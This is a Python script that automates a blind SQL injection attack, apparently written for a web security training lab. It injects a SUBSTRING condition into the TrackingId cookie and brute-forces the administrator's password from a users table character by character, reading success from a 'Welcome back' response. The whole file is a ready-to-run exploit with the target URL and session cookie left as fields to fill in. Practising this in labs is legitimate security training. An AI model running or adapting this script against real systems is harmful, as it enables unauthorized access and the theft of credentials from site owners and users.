import requests
import string
import time

# ===================== SETTINGS =====================
URL = ""                           #TYPE YOUR URL HERE
TRACKING_ID = ""           #TYPE YOUR TRACKING_ID HERE
SESSION = ""          #TYPE YOUR SESSION HERE (cookie)

REQUESTS_PER_SECOND = 5  # Set how many requests per second (recommended: 2-5)
PASSWORD_LENGTH = 20
# ====================================================

CHARS = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*"
DELAY = 1 / REQUESTS_PER_SECOND

def check_char(position, char):
    payload = f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}"
    cookies = {
        "TrackingId": payload,
        "session": SESSION
    }
    print(f"Checking position {position}, char {char}...")
    response = requests.get(URL, cookies=cookies, timeout=10)
    time.sleep(DELAY)
    return "Welcome back" in response.text

password = ""
print(f"Cracking password... ({REQUESTS_PER_SECOND} requests/sec)")

for i in range(1, PASSWORD_LENGTH + 1):
    for char in CHARS:
        if check_char(i, char):
            password += char
            print(f"Char {i}: {char} | Password so far: {password}")
            break

print(f"\nAdministrator password: {password}")
